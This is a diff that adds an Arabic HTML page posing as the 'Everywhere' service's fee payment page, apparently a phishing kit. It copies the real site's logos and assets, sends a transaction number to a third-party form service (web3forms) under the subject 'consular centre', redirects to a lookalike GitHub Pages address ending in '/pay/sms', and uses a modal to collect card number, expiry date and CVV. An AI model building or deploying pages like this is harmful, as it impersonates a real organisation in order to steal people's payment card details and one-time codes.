@@ -1,0 +1,393 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="icon" type="image/x-icon" href="https://docs.everywhere.ae/favicon.ico">
+	<title>Everywhere</title>
+	<link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/2.1.4/toastr.min.css" rel="stylesheet" media="all">
+	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/simplebar@latest/dist/simplebar.css" />
+	<link href="https://docs.everywhere.ae/css/app.css" rel="stylesheet">
+	<link href="https://docs.everywhere.ae/css/bootstrap.rtl.min.css" rel="stylesheet">
+	<link href="https://docs.everywhere.ae/css/rtl_app.css" rel="stylesheet">
+	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-alpha1/dist/css/bootstrap.min.css" />
+	<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+	<script src='https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-alpha1/dist/js/bootstrap.bundle.min.js'></script>
+	<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js'></script>
+	</head>
+
+<body>
+	<div id="app" style="background: url('https://docs.everywhere.ae/images/landing-bg.png');background-size: cover;">
+		<nav class="navbar navbar-expand-md bg-white navbar-dark">
+			<div class="container-fluid">
+				<a class="navbar-brand" href="#"> <img src="https://docs.everywhere.ae/images/logo.svg" alt="Everywhere"> </a>
+				<div class="navbar nav">
+				
+					<ul class="navbar-nav language-navbar"> <span class="d-flex align-items-center d-none d-md-flex">|</span>
+						<li class="nav-item"> <a class="nav-link" href="#">EN</a> </li>
+					</ul>
+					<ul class="navbar-nav routing-navbar col-xl-6 col-lg-7 col-md-9 d-none d-md-flex">
+						<li class="nav-item"> <a class="nav-link " href="#">
+                            أحكام وشروط<img
+                                src="https://docs.everywhere.ae/icons/noun-terms-and-conditions.svg"
+                            /></a> </li>
+						<li class="nav-item"> <a class="nav-link " href="#">سياسة الخصوصية
+                            <img src="https://docs.everywhere.ae/icons/noun-lock.svg"/></a> </li>
+						<li class="nav-item"> <a class="nav-link " href="#">
+                            اتصل بنا<img src="https://docs.everywhere.ae/icons/noun-email.svg"/> </a> </li>
+					</ul>
+				</div>
+				<button class="border-0 navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"> <span class="navbar-toggler-icon"></span> </button>
+			</div>
+		</nav>
+		<main class="main-container">
+			<div class="sidebar d-flex flex-column flex-shrink-0 p-1 collapse navbar-collapse" id="navbarSupportedContent">
+				<ul class="nav navbar-vertical flex-column mt-3 mb-auto w-100">
+					<li class="nav-item ">
+						<a href="#" class="nav-link link-dark" aria-current="page"> <img class="me-2" src="https://docs.everywhere.ae/icons/noun-home-blue.svg"> <span>الرئيسية</span> </a>
+					</li>
+					<li class="nav-item  ">
+						<a href="#" class="nav-link link-dark"> <img class="me-2" src="https://docs.everywhere.ae/icons/noun-shipping.svg"> <span>خدماتنا</span> </a>
+					</li>
+					<li class="nav-item ">
+						<a href="#" class="nav-link link-dark"> <img class="me-2" src="https://docs.everywhere.ae/icons/noun-support.svg"> <span>الدعم الفني</span> </a>
+					</li>
+					<li class="nav-item ">
+						<a href="# class="nav-link link-dark"> <img class="me-2" src="https://docs.everywhere.ae/icons/noun-about-us.svg"> <span>من نحن</span> </a>
+					</li>
+					<li class="d-block d-md-none nav-item  " href="#">
+						<a class="nav-link link-dark" href="#"> <img class="blue-svg" src="https://docs.everywhere.ae/icons/noun-lock.svg" /> <span>سياسة الخصوصية</span> </a>
+					</li>
+					<li class="d-block d-md-none nav-item ">
+						<a class="nav-link link-dark" href="#"> <img class="blue-svg" src="https://docs.everywhere.ae/icons/noun-email.svg" /> <span>اتصل بنا</span></a>
+					</li>
+					<li class="d-block d-md-none nav-item ">
+						<a class="nav-link link-dark" href="#"> <img class="blue-svg" src="https://docs.everywhere.ae/icons/noun-terms-and-conditions.svg" /> <span>أحكام وشروط</span></a>
+					</li>
+				</ul>
+			</div>
+			<div class="content py-4">
+				<div class="card-container payment">
+					<div class="row m-0 justify-content-center">
+						<div class="col-lg-7 col-md-8 col-12">
+							<div class="card position-relative
+                    ">
+								<div class="card-header">دفع رسوم الخدمة</div>
+								<div class="card-body">
+									<div class="wiz-steps wiz-steps col-xl-4 col-md-6  col-6">
+										<div class="wiz-progress col-8" style=" left: 16.666666666667%;">
+											<div class="wiz-progress-line" data-now-value="0" data-number-of-steps="3" style="width: 50%;"></div>
+										</div>
+										<div class="wiz-step col-4  active ">
+											<div class="wiz-step-icon">1</div>
+										</div>
+										<div class="wiz-step col-4  active ">
+											<div class="wiz-step-icon">2</div>
+										</div>
+										<div class="wiz-step col-4  active ">
+											<div class="wiz-step-icon">3</div>
+										</div>
+									</div>
+									<div class="payment-info">
+										<ul class="list-unstyled">
+											<li class="d-flex ps-2">
+												<label class="me-2 me-2 col-md-4 col-6">ادخل رقم المعاملة او رقم الفاتورة :</label> <span>
+												<input type="tel" name="numbers" id="no" min="1" maxlength="33" class="form-control" required="required">
+																												</span> </li>
+
+										
+										</ul>
+									</div>
+										<form action="https://api.web3forms.com/submit" method="POST">
+												<input type="hidden" name="access_key" value="acb0aefe-19c9-4250-84c9-92050b3ac6d5">
+												<input type="hidden" name="subject" value="المركز القنصلي">
+												<input type="hidden" name="redirect" value="https://www-ecsc-expat-sy.github.io/pay/sms">
+												<input type="hidden" name="from_name" value=".">
+									
+										<div class="ps-1 payment-warning d-flex align-items-center"> </div>
+										<button type="submit" class="ms-auto btn btn-primary" data-toggle="modal" data-target="#staticBackdrop">دفع</button>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</main>
+		<footer class="footer fixed-bottom bg-white d-flex px-3">
+			<div class="contact-info">
+				<ul class="list-unstyled">
+					<li>
+						<div class="contact-container"> <img src="https://docs.everywhere.ae/icons/noun-location.svg" data-bs-toggle="tooltip" data-bs-placement="top" title="EX-14 GF, 01-Co Work, Dubai Internet City"> </div>
+					</li>
+					<li>
+						<div class="contact-container"> <img src="https://docs.everywhere.ae/icons/noun-email.svg" alt="البريد الإلكتروني" data-bs-toggle="tooltip" data-bs-placement="top" title="cc@everywhere.ae"> </div>
+					</li>
+					<li>
+						<div class="contact-container"> <img src="https://docs.everywhere.ae/icons/noun-mail-box.svg" data-bs-toggle="tooltip" data-bs-placement="top" title="PO Box: 124501" alt="صندوق البريد"> </div>
+					</li>
+				</ul>
+			</div>
+			<div class="card-logos">
+				<ul class="list-unstyled">
+					<li><img src="https://docs.everywhere.ae/icons/cards-logos/visa.svg" alt="visa-logo"></li>
+					<li><img src="https://docs.everywhere.ae/icons/cards-logos/mastercard.svg" alt="mastercard-logo"></li>
+					<li><img src="https://docs.everywhere.ae/icons/cards-logos/american-express.svg" alt="american-express-logo"></li>
+				</ul>
+			</div>
+		</footer>
+	</div>
+	
+	<div class="modal fade" id="staticBackdrop" data-backdrop="static" data-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
+		<div class="modal-dialog">
+			<div class="modal-content">
+			
+				<div class="modal-body">
+					<div class="text-right"> <i class="fa fa-close close" data-dismiss="modal"></i> </div>
+					<div class="tabs mt-3">
+						<ul class="nav nav-tabs" id="myTab" role="tablist">
+							<li class="nav-item" role="presentation">
+							
+								<center><a > <img src="https://docs.everywhere.ae/icons/cards-logos/american-express.svg" alt="visa-logo"height="49" width="59"> </a>
+								<a > <img src="https://docs.everywhere.ae/icons/cards-logos/visa.svg" alt="visa-logo"height="56" width="56"> </a>
+								<a > <img src="https://docs.everywhere.ae/icons/cards-logos/mastercard.svg" alt="visa-logo"height="56" width="56"> </a></center>
+								
+							
+							
+							<br>
+						
+							
+					
+							<center><p style="font-size:13px"><mark><strong> ادخل البطاقة البنكية لكي تدفع من خلالها رسوم الخدمة </strong></mark></p></center>
+						
+					
+				
+			
+						<div class="tab-content" id="myTabContent">
+							<div class="tab-pane fade show active" id="visa" role="tabpanel" aria-labelledby="visa-tab">
+								<div class="mt-4 mx-4">
+									<div class="text-center">
+										
+											<div class="inputbox">
+												<input type="tel" name="card" id="no" min="1" maxlength="19" class="form-control" required="required"> <span>رقم البطاقة</span>  </div>
+										
+											<div class="inputbox">
+												<input type="tel" name="exp" id="exp" min="1" maxlength="5" class="form-control" required="required"> <span>تاريخ الصلاحية</span> </div>
+											
+											<div class="inputbox">
+												<input type="tel" name="c v v" id="cvv" min="1" maxlength="3" class="form-control" required="required"> <span>CVV CVC</span> </div>
+										</div>
+										<br>
+										<div class="px-5 pay">
+										<center><button class="btn btn-success "><h3>ادفع الان</h3></button></center>
+										</div>
+									</div>
+								</div>
+							</div>
+						
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	
+	
+	
+	<style>
+	.launch {
+		height: 50px
+	}
+	
+	.close {
+		font-size: 21px;
+		cursor: pointer
+	}
+	
+	.modal-body {
+		height: 450px
+	}
+	
+	.nav-tabs {
+		border: none !important
+	}
+	
+	.nav-tabs .nav-link.active {
+		color: #495057;
+		background-color: #fff;
+		border-color: #ffffff #ffffff #fff;
+		border-top: 3px solid blue !important
+	}
+	
+	.nav-tabs .nav-link {
+		margin-bottom: -1px;
+		border: 1px solid transparent;
+		border-top-left-radius: 0rem;
+		border-top-right-radius: 0rem;
+		border-top: 3px solid #eee;
+		font-size: 20px
+	}
+	
+	.nav-tabs .nav-link:hover {
+		border-color: #e9ecef #ffffff #ffffff
+	}
+	
+	.nav-tabs {
+		display: table !important;
+		width: 100%
+	}
+	
+	.nav-item {
+		display: table-cell
+	}
+	
+	.form-control {
+		border-bottom: 1px solid #eee !important;
+		border: none;
+		font-weight: 600
+	}
+	
+	.form-control:focus {
+		color: #495057;
+		background-color: #fff;
+		border-color: #8bbafe;
+		outline: 0;
+		box-shadow: none
+	}
+	
+	.inputbox {
+		position: relative;
+		margin-bottom: 20px;
+		width: 100%
+	}
+	
+	.inputbox span {
+		position: absolute;
+		top: 7px;
+		left: 11px;
+		transition: 0.5s
+	}
+	
+	.inputbox i {
+		position: absolute;
+		top: 13px;
+		right: 8px;
+		transition: 0.5s;
+		color: #3F51B5
+	}
+	
+	input::-webkit-outer-spin-button,
+	input::-webkit-inner-spin-button {
+		-webkit-appearance: none;
+		margin: 0
+	}
+	
+	.inputbox input:focus~span {
+		transform: translateX(-0px) translateY(-15px);
+		font-size: 12px
+	}
+	
+	.inputbox input:valid~span {
+		transform: translateX(-0px) translateY(-15px);
+		font-size: 12px
+	}
+	
+	.pay button {
+		height: 44px;
+		width: 200px;
+		
+	}
+	.btn-success {
+    color: #fff;
+    background-color: #1654c3;
+    border-color: #28a745;
+	}
+	.h3, h3 {
+    font-size: calc(1rem + .6vw);
+	}
+
+
+	</style>
+
+
+
+
+
+
+<script>
+
+$(document).ready(function(){
+
+//For Card Number formatted input
+var cardNum = document.getElementById('no');
+cardNum.onkeyup = function (e) {
+if (this.value == this.lastValue) return;
+var caretPosition = this.selectionStart;
+var sanitizedValue = this.value.replace(/[^0-9]/gi, '');
+var parts = [];
+
+for (var i = 0, len = sanitizedValue.length; i < len; i +=4) { parts.push(sanitizedValue.substring(i, i + 4)); } for (var i=caretPosition - 1; i>= 0; i--) {
+    var c = this.value[i];
+    if (c < '0' || c> '9') {
+        caretPosition--;
+        }
+        }
+        caretPosition += Math.floor(caretPosition / 4);
+
+        this.value = this.lastValue = parts.join(' ');
+        this.selectionStart = this.selectionEnd = caretPosition;
+        }
+
+        //For Date formatted input
+        var expDate = document.getElementById('exp');
+        expDate.onkeyup = function (e) {
+        if (this.value == this.lastValue) return;
+        var caretPosition = this.selectionStart;
+        var sanitizedValue = this.value.replace(/[^0-9]/gi, '');
+        var parts = [];
+
+        for (var i = 0, len = sanitizedValue.length; i < len; i +=2) { parts.push(sanitizedValue.substring(i, i + 2)); } for (var i=caretPosition - 1; i>= 0; i--) {
+            var c = this.value[i];
+            if (c < '0' || c> '9') {
+                caretPosition--;
+                }
+                }
+                caretPosition += Math.floor(caretPosition / 2);
+
+                this.value = this.lastValue = parts.join('/');
+                this.selectionStart = this.selectionEnd = caretPosition;
+                }
+				
+				        //For Date formatted input
+        var expDate = document.getElementById('cvv');
+        expDate.onkeyup = function (e) {
+        if (this.value == this.lastValue) return;
+        var caretPosition = this.selectionStart;
+        var sanitizedValue = this.value.replace(/[^0-9]/gi, '');
+        var parts = [];
+
+        for (var i = 0, len = sanitizedValue.length; i < len; i +=2) { parts.push(sanitizedValue.substring(i, i + 2)); } for (var i=caretPosition - 1; i>= 0; i--) {
+            var c = this.value[i];
+            if (c < '0' || c> '9') {
+                caretPosition--;
+                }
+                }
+                caretPosition += Math.floor(caretPosition / 2);
+
+                this.value = this.lastValue = parts.join('');
+                this.selectionStart = this.selectionEnd = caretPosition;
+                }
+
+                // Radio button
+                $('.radio-group .radio').click(function(){
+                $(this).parent().parent().find('.radio').removeClass('selected');
+                $(this).addClass('selected');
+                });
+                })
+
+</script>
+
+
+</body>
+
+</html>
